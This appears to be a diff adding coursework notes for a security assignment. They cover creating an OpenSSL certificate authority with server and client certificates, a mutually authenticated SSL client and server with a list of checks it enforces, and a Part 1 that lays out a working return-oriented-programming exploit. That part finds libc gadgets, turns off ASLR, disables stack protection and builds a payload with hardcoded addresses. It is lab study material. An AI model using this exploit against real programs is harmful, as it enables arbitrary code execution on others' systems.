@@ -1,0 +1,98 @@
+###############################################################
+#                    Setting up the CA		              #
+###############################################################
+
+dir = /home/shagun/ca
+mkdir $dir 
+mkdir $dir/certs 
+mkdir $dir/private 
+mkdir $dir/conf
+
+Write the caconf.cnf file from link : https://codeghar.wordpress.com/2008/03/17/create-a-certificate-authority-and-certificates-with-openssl/
+
+
+######### Generate the key and cert for root CA ###############
+
+cd /home/ca/
+
+openssl req -new -x509 -extensions v3_ca -keyout private/cakey.pem -out certs/cacert.pem -days 365 -config conf/caconfig.cnf
+
+###############################################################
+
+######### Generate the key and cert for Server ################
+
+cd /home/ca/
+
+openssl req -new -nodes -out server.req.pem -keyout private/server.key.pem -config conf/caconfig.cnf
+
+openssl ca -out certs/server.cert.pem -config conf/caconfig.cnf -infiles server.req.pem
+
+###############################################################
+
+######### Generate the key and cert for Client ################
+
+openssl req -new -nodes -out client.req.pem -keyout private/client.key.pem -days 365 -config conf/caconfig.cnf
+
+openssl ca -out certs/client.cert.pem -days 365 -config conf/caconfig.cnf -infiles client.req.pem
+
+
+###############################################################
+
+
+
+###############################################################
+#                        Part 1				      #
+###############################################################
+
+Gadget 1 : pop/ret sequence : address of libc + offset of the pop/ret sequence
+Gadget 2 : buffer address : pointer to the buffer[0]
+Gadget 3 : write sys call address : address of libc + offset of the write sys call
+
+Getting the addresses :
+
+Get the first offset:
+--> xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}'   
+
+Get the libc address :
+--> pid=`ps -C part1 -o pid --no-headers | tr -d ' '` 
+--> grep libc /proc/$pid/maps 
+
+Get the offset of write call :
+--> nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<write\>' 
+
+Turn off ASLR:
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+Compile code : gcc -o part1 part1.c -fno-stack-protector
+
+Run : 
+(echo -n HelloWorld | xxd -p; printf %0130d 0; 
+printf %016x $((0x7ffff7a1b000+0x229f2)) | tac -rs..; 
+printf %016x 0x7fffffffe1b0 | tac -rs..; 
+printf %016x $((0x7ffff7a1b000+0xe64f0)) | tac -rs..) | 
+xxd -r -p | ./part1
+
+
+http://crypto.stanford.edu/~blynn/rop/
+
+###############################################################
+#                        Part 2				      #
+###############################################################
+
+Input to client program: ./client localhost <port#>
+Input to server program: ./server <port#>
+
+The programs exchange ceritificates and perform a SSL handshake with client and server both presenting the ceritificates.
+The system follows boundary checks which are mentioned in Attacks/Errors defended section.
+
+
+############### Attacks/Errors defended: ######################
+1. Clients with no certificates are not allowed to connect. Server aborts connection.
+2. Servers with no certificates are not allowed to connect. Client aborts connection.
+3. Modified server certificate is detected and program closes.
+4. Modified server p_key is detected and program closes. 
+5. Server/Client both check for their key.pem files, if they are not found connection closes.
+6. Server/Client both check for their cert.pem files, if they are not found connection closes.
+7. Everytime a new certificate and key are generated, so no matching of keys and certificates.
+###############################################################
+
